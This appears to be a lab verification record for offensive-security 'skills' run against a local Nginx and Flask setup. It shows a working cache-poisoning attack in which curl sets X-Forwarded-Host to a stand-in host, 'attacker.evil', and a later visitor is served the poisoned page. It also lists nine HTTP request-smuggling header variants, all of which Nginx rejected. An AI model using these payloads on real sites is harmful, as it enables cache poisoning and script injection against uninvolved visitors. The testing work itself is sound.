> Historical upstream lab account; this catalog includes no compose/origin/nginx fixture or packet captures. No described live test was rerun or independently verified here. Product-wide conclusions and severity below cannot be inferred from this single reported topology.

# Verification — Phase 2H: cache poisoning + HTTP smuggling

> Two-server lab (Nginx 1.27 proxy + gunicorn/Flask origin) via Docker. Cache poisoning succeeded; HTTP smuggling **didn't** — and the failure mode is exactly the kind of honest negative that updates the skill content.

## Target

`docker-compose.yml` building Nginx 1.27 (front-end with `proxy_cache`) + gunicorn-served Flask (origin reflecting `X-Forwarded-Host`).

External fixture path: `docs/verification/phase2h-lab/` (not bundled).

```bash
mkdir -p ~/phase2h-lab && cd ~/phase2h-lab
# Copy the docker-compose.yml + origin/ + nginx/ from docs/verification/phase2h-lab/
docker-compose up -d --build
# Front-end on :58016, origin on :58015
```

| Endpoint | Bug | Skill |
|---|---|---|
| `GET /` (cached by Nginx) | `X-Forwarded-Host` reflected into `<link>`/`<script>` URLs; cache key omits headers | `hunt-cache-poison` |
| Raw TCP to Nginx :80 | CL.TE / TE.CL / obfuscation variants | `hunt-http-smuggling` |

---

## Test 19 — cache poisoning via X-Forwarded-Host (`hunt-cache-poison`)

**Initial prompt:**
> "Nginx is fronting this app and the page loads JS from a `<script src=https://...>` tag that includes the X-Forwarded-Host header value. Can I poison the cache?"

**Skill that auto-triggers:** `hunt-cache-poison` — description includes "unkeyed inputs (X-Forwarded-Host, X-Original-URL, custom headers)".

**Technique from `hunt-cache-poison`:**
> `X-Forwarded-Host: attacker.com` (poisons script src URLs) → response gets cached → all subsequent visitors served the poisoned page.

### Live attack

```bash
# 1. Attacker hits a fresh URL with X-Forwarded-Host pointing to attacker domain.
#    Use a cache-buster query so we're not served an existing cache entry.
URL="http://localhost:58016/?cb=$(date +%s%N)"

curl -i -H "X-Forwarded-Host: attacker.evil" "$URL"
```

Attacker response:

```
X-Cache-Status: MISS
...
  <link rel="stylesheet" href="https://attacker.evil/static/style.css">
  <h1>Welcome — assets load from attacker.evil</h1>
```

The origin reflected `attacker.evil` into the response. Nginx cached this response keyed by `$scheme$request_method$host$request_uri` only — NOT by `X-Forwarded-Host`.

### Victim hit

```bash
# Victim makes a normal request (no special headers) to the same URL
curl -i "$URL"
```

Victim response:

```
X-Cache-Status: HIT
...
  <link rel="stylesheet" href="https://attacker.evil/static/style.css">
  <h1>Welcome — assets load from attacker.evil</h1>
```

**`X-Cache-Status: HIT`** — victim is served the poisoned response from the cache. The CSS / JS URLs now point at `https://attacker.evil/`. Victim's browser will fetch attacker-controlled assets.

### Impact chain

1. Attacker (single request) poisons the cache for the URL
2. Cache TTL = 5 minutes (lab config) → 5 minutes of poisoned response served to every visitor of that URL
3. Victim's browser fetches `https://attacker.evil/static/app.js` → attacker controls JS executed in the victim's page context (XSS via cache poisoning)

`hunt-cache-poison`'s chain: **cache poisoning + reflected unkeyed header → persistent XSS across all CDN-cached visitors**. Verified.

### Verdict

**PASS — live cache poisoning + XSS chain.** Exact technique from `hunt-cache-poison`. `triage-validation` 7-Question Gate passes all 7 — Critical.

---

## Test 20 — HTTP smuggling on Nginx 1.27 (`hunt-http-smuggling`)

**Initial prompt:**
> "Nginx in front of gunicorn — testing for CL.TE / TE.CL smuggling."

**Skill that auto-triggers:** `hunt-http-smuggling` — description includes "CL.TE, TE.CL, H2.CL, H2.TE", "obfuscation variants (space before colon, trailing space, lowercase, mixed-case)".

### Probes from the skill

Nine payload variants reported, raw TCP to Nginx 1.27:

| Variant | Headers | Result |
|---|---|---|
| Classic TE.CL | `Transfer-Encoding: chunked` + `Content-Length: 4` | HTTP 400 |
| Classic CL.TE | `Content-Length: 13` + `Transfer-Encoding: chunked` | HTTP 400 |
| Space before colon | `Transfer-Encoding : chunked` | HTTP 400 |
| Trailing space | `Transfer-Encoding: chunked ` (trailing space) | HTTP 400 |
| Tab separator | `Transfer-Encoding:\tchunked` | HTTP 501 |
| Lowercase value | `Transfer-Encoding: Chunked` | HTTP 400 |
| Mixed-case header | `TrAnSFER-eNCODing: chunked` | HTTP 400 |
| Double TE | `Transfer-Encoding: cow` + `Transfer-Encoding: chunked` | HTTP 400 |
| X-prefix smuggle | `X-Transfer-Encoding: chunked` + `Transfer-Encoding: chunked` | HTTP 400 |

**All 9 payloads rejected.** Nginx 1.27 is **RFC 9112 strict** by default. When both `Content-Length` and `Transfer-Encoding` are present, the request is killed at the front-end with HTTP 400.

The tab-separator variant returned `501 Not Implemented` — Nginx parses the encoding name `\tchunked` and rejects it as unknown rather than treating it as the same encoding as `chunked`. Either way, smuggling fails.

### Scope of the reported negative

The reported rejection applies only to the described configuration and payloads.
It does not certify every Nginx version, other proxy products or arbitrary CDN
chains. Do not reconstruct a vulnerability matrix from banners or this record.
Verify exact affected/fixed versions against current primary vendor advisories.
The displayed cached HTML proves a reflected asset URL, not execution of JavaScript
in a browser; a critical XSS claim needs additional controlled browser evidence.

## Summary — Phase 2H

| # | Test | Skill | Result |
|---|---|---|---|
| 19 | Cache poisoning via X-Forwarded-Host | `hunt-cache-poison` | PASS — victim served attacker's CSS/JS URLs from cache |
| 20 | HTTP smuggling on Nginx 1.27 | `hunt-http-smuggling` | **Negative — Nginx hardened**. Gap closed with target-suitability matrix. |

Upstream aggregate exercise counts are unverified historical claims, not this catalog review’s validation.

This is the second honest negative + content-update cycle in two phases (Phase 2G XXE + Phase 2H smuggling). Both produce updates that make the skill content more accurate for 2026 deployment realities.

---

## Lab cleanup

```bash
docker-compose down
```

Containers ephemeral — no persistence needed.
